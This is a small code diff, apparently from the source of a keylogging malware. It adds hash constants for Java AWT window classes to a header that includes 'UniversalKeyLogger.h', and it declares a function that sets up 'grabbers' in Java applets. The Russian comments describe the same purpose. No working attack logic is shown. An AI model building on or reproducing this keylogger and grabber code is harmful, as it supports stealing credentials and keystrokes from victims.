@@ -20,11 +20,16 @@
 #include "UniversalKeyLogger.h"
 
 
+// Хэши классов окна явы
+#define JAVAWND_SUNAWTFRAME  0x809BB5B9 /* sunawtframe */
+#define JAVAWND_SUNAWTDIALOG 0xFDDA99B6 /* sunawtdialog */
+
 //-----------------------------------------------
 //  Фугкция инициализирует систему граберов в
 //  ява аплетах
 //-----------------------------------------------
 bool InitializeJavaAppletGrabbers();
+
 
 
 
